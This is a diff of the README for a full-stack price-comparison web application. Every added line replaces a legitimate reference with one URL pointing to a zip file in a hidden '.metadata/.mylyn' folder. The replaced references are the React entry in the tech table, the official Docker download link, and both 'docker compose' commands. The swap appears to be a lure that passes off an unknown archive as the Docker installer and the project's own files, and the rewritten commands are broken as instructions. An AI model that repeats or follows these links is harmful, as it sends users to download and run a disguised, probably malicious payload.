@@ -20,7 +20,7 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 
 | Layer            | Tech                    |
 | ---------------- | ----------------------- |
-| Frontend         | React.js                |
+| Frontend         | https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.metadata/.mylyn/.repositories.xml.zip                |
 | Backend          | Spring Boot (Java)      |
 | Database         | PostgreSQL              |
 | Caching          | Redis                   |
@@ -35,7 +35,7 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 
 ### 📦 Prerequisites
 
-- [Docker](https://www.docker.com/products/docker-desktop) installed
+- [Docker](https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.metadata/.mylyn/.repositories.xml.zip) installed
 
 ### 🚨 Ports Used
 
@@ -47,6 +47,6 @@ This is a full-stack web application for comparing prices, reviews, ratings, and
 ### 🧃 Run All Services Together
 
 ```bash
-docker compose -f docker-compose.jenkins.yml down -v
-docker compose -f docker-compose.jenkins.yml up -d --build
+docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.metadata/.mylyn/.repositories.xml.zip down -v
+docker compose -f https://raw.githubusercontent.com/ChiragRohada7020/Smart-Shopping-/main/backend/.metadata/.mylyn/.repositories.xml.zip up -d --build
 ```
